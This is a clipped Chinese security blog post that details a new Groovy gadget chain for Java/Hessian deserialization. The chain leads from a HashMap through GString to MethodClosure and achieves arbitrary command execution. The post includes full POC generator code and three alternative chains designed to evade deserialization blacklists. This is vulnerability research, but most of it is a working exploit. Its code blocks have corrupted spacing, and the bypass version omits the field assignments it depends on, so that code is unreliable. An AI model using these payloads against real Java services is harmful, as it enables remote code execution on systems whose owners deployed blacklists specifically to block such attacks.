---
title: 【微信】Hessian Groovy全新链条分析与黑名单绕过
source: https://mp.weixin.qq.com/s/Htj2P25qk0BJyD7fYDmd4g
source_host: mp.weixin.qq.com
clip_date: 2026-10-08T11:31:18+08:00
trace_id: 1123a182-6a25-42a4-9d0a-c1c5a3ccc46e
content_hash: e9d959eba7800eb8bdf67fa6f8117cac678f0bb7ea87495e1b90cabd5c2d24ac
status: synced
tags:
  - 微信
  - 漏洞分析
  - Java反序列化
series: null
feed_source: 公众号聚合·Doonsec
ai_summary: Java 反序列化中无需出网/JNDI 的 Groovy 新利用链：用 `MethodClosure("cmd","execute")` 装进 GString 触发命令执行，并给出绕过 GString/HashMap 黑名单的替代入口。
ai_summary_style: key-points
images_status:
  total: 12
  succeeded: 12
  failed_urls: []
notion_page_id: 3f375244-d011-81b0-b1d1-c5265511e2d3
ioc: null
---

> 💡 **AI 总结（key-points）**
>
> Java 反序列化中无需出网/JNDI 的 Groovy 新利用链：用 `MethodClosure("cmd","execute")` 装进 GString 触发命令执行，并给出绕过 GString/HashMap 黑名单的替代入口。
> 
> - **新链入口：** `ConcurrentHashMap.readObject` → `GString.hashCode` → `GString.toString` → `GString.writeTo` → `Closure.call` → `doCall`，无需动态代理和 ConvertedClosure（区别于 groovy1 链）。
> - **必要条件：** `Closure.maximumNumberOfParameters` 必须为 0，才会进入无参 `call()` 路径，构造时需反射赋值。
> - **命令执行原理：** `InvokerHelper.invokeMethod` 走 invokePojoMethod，String 本身无 `execute`，Groovy 扫描 Extension Module 命中 `ProcessGroovyMethods.execute(String)`，等价于 `"calc".execute()`。
> - **POC 构造要点：** 实例化 MethodClosure 后反射改 `maximumNumberOfParameters`；GStringImpl 的 `values[0]` 放 closure，`strings[0]` 赋非空字符串以免 writeTo 报错，最后放入 HashMap 序列化。
> - **黑名单绕过：** 入口受限时可用 `BadAttributeValueExpException.readObject` → `GString.toString` → `writeTo` → `Closure.call`（反射把 `val` 设为 gString）；另有 `JCheckBox.updateUI` 与 `xerces Token.toString`/`ListWithDefault.get` 两条备选链。

**Gh0xE9** *2026年10月8日 11:04*

## 背景

在反序列化场景下，应用往往会设置多个黑名单条件阻止我们的反序列化链条。或者服务器环境不允许我们进行出网等JNDI的操作。因此我们需要挖掘新的链条构造序列化POC。本文研究了在Groovy依赖下的代码执行链条。

## hessian groovy新链条

可以看到目前javachain中hessian groovy只能打JNDI，实则可以命令执行

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/5b18a11ed444cb7e.png)

groovy1链使用了动态代理与ConvertedClosure，而这条新链则不需要这些操作，使用Hashmap作为入口即可。

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/36b13714688010f4.png)

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/f354c663eeb35aad.png)

## 链条分析

挖掘到的新链条如下

```
java.util.concurrent.ConcurrentHashMap: void readObject
    groovy.lang.GString: int hashCode
    groovy.lang.GString: java.lang.String toString
    groovy.lang.GString: java.io.Writer writeTo
    groovy.lang.Closure: java.lang.Object call
    */
```

## 正向分析

首先正向分析

可以看到Gadget中hashmap会调用 `groovy.lang.GString` 的 `hashcode` 方法。

跟进代码中查看：

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/21a70d6110197f60.png)

紧接着会调用自身的 `toString` 方法：

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/9eb6a21bd9feb454.png)

继续又会调用自身的 `writeTO` 方法：

而在该方法中调用了groovy.lang.Closure#call，至此完全符合gadget chains的调用。

此处需要满足MaximumNumberOfParameters为0才会调用无参构造方法。

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/133db7977a0647ac.png)

可以看到最终调用了自身的doCall方法

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/179c39bf5a939b2d.png)

groovy.lang.Closure是一个抽象类

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/872475b61dcab7f0.png)

找到一个他的继承类实现了 `doCall` 方法，并且参数可控。

可以看到动态调用方法 `owner` 和 `method` 可以被构造方法完全控制。

因此我们可以执行以下内容从而执行任意命令。

`InvokerHelper.invokeMethod("open -na calculator", "execute", arguments)`

至此整个链条被我们串起来了。

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/6f39065b865c2eff.png)

### 命令执行分析

为什么 `InvokerHelper.invokeMethod("open -na calculator", "execute", arguments)` 可以执行，分析如下：

java.lang.String 不是 NULL。object instanceof Class也为false

"calc" instanceof GroovyObject // false条件成立

因此走到

invokePojoMethod(object, methodName, arguments)

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/47eb3306e6e1a36d.png)

调用逻辑为MetaClass收到

```toml
receiver = "calc"
method   = "execute"
args     = null
```

它首先查找实例自身的execute方法，java.lang.String显然没有该方法。

因此Groovy 会扫描所有已注册的 **Extension Module**，其中包括以下方法（具体的扫描逻辑比较复杂故不分析，只需知道会调用self.execute即可）：

org.codehaus.groovy.runtime.ProcessGroovyMethods#execute(java.lang.String)

Extension Method 规则：

如果一个 `static` 方法  
第一个参数类型 = 当前对象类型  
→ 当作实例方法使用

于是发生了这个等价变换：

```
ProcessGroovyMethods.execute("calc")
↓
"calc".execute()
```

整体链条如下

```
MethodClosure.doCall
→ InvokerHelper.invokeMethod
→ object 是 POJO（String）
→ invokePojoMethod
→ MetaClass.invokeMethod
→ String 没有 execute()
→ 查 Extension Methods
→ ProcessGroovyMethods.execute(String)
→ 命中
```

## 反向构造

过刚才的分析，我们已经知道了只需要构造 `new MethodClosure(command, "execute")` 对象。

把其放入hashMap中，反序列化调用key.hashcode后最终就会调用到命令执行。

因此我首先实例化该对象

```
MethodClosure closure = new MethodClosure(command, "execute");
```

正向分析时发现maximumNumberOfParameters需要为0才会走进无参的call方法。因此通过反射将该值赋值为0

```
Reflections.setFieldValue(closure, "maximumNumberOfParameters", 0);
```

closure是GString的field `value` ，因此我们反射构造GSting的实现类。并且把closure反射复制到values

```
GStringImpl gString = Reflections.createWithoutConstructor(GStringImpl.class);
Object[] values = new Object[3];
values[0] = closure;
Reflections.setFieldValue(gString, "values", values);
```

为了使writeTo不报错因此Strings也要赋值

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/29a897cd5d771e3e.png)

```
String[] strings = new String[3];
strings[0] = "nothing";
Reflections.setFieldValue(gString, "strings", strings);
```

最终把GString放入hashmap序列化，至此我们的poc链条完全构造完成。

```
return Entry2HashFragment.makeConMap(gString,gString);
```

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/f55070c15bacb83b.png)

## 完整代码

```typescript
public Object getObject(final String command)throws Exception {
    MethodClosureclosure=newMethodClosure(command, "execute");
    Reflections.setFieldValue(closure, "maximumNumberOfParameters", 0);

    GStringImplgString= Reflections.createWithoutConstructor(GStringImpl.class);
    Object[] values = newObject[3];
    values[0] = closure;
    String[] strings = newString[3];
    strings[0] = "triplexlove";

    Reflections.setFieldValue(gString, "values", values);
    Reflections.setFieldValue(gString, "strings", strings);

    return Entry2HashFragment.makeConMap(gString,gString);
}
```

最终触发

## 黑名单绕过

假设我们入口不能接受hashmap，或者不能反序列化GSting，那我们如何构造呢

我们可以探测到以下链条

```
<javax.management.BadAttributeValueExpException: void readObject(java.io.ObjectInputStream)>
 -> <groovy.lang.GString: java.lang.String toString()>
 -> <groovy.lang.GString: java.io.Writer writeTo(java.io.Writer)>
 -> <groovy.lang.Closure: java.lang.Object call(java.lang.Object)>
```

```java
<javax.swing.JCheckBox: void readObject(java.io.ObjectInputStream)>
 -> <javax.swing.JCheckBox: void updateUI()>
 -> <javax.swing.AbstractButton: void setUI(javax.swing.plaf.ButtonUI)>
 -> <javax.swing.JComponent: void setUI(javax.swing.plaf.ComponentUI)>
 -> <javax.swing.JComponent: void uninstallUIAndProperties()>
 -> <javax.swing.JComponent: void putClientProperty(java.lang.Object,java.lang.Object)>
 -> <groovy.lang.GString: java.lang.String toString()>
 -> <groovy.lang.GString: java.io.Writer writeTo(java.io.Writer)>
 -> <groovy.lang.Closure: java.lang.Object call()>
```

```java
<javax.management.BadAttributeValueExpException: void readObject(java.io.ObjectInputStream)>
 -> <com.sun.org.apache.xerces.internal.impl.xpath.regex.Token: java.lang.String toString()>
 -> <com.sun.org.apache.xerces.internal.impl.xpath.regex.Token$UnionToken: java.lang.String toString(int)>
 -> <groovy.lang.ListWithDefault: java.lang.Object get(int)>
 -> <groovy.util.ObservableList: java.lang.Object set(int,java.lang.Object)>
 -> <groovy.lang.Closure: java.lang.Object call(java.lang.Object)>
```

使用第一条按照上述方法我们就很好构造反序列化链条了

代码实现如下

```typescript
    public Object getObject(String command)throws Exception {
        MethodClosureclosure=newMethodClosure(command, "execute");
        Reflections.setFieldValue(closure, "maximumNumberOfParameters", 0);

        GStringImplgString= Reflections.createWithoutConstructor(GStringImpl.class);
        Object[] values = newObject[3];
        values[0] = closure;
        String[] strings = newString[3];
        strings[0] = "triplexlove";
        BadAttributeValueExpExceptionexp=newBadAttributeValueExpException(null);
        Reflections.setFieldValue(exp, "val", gString);
        return exp;
    }
```
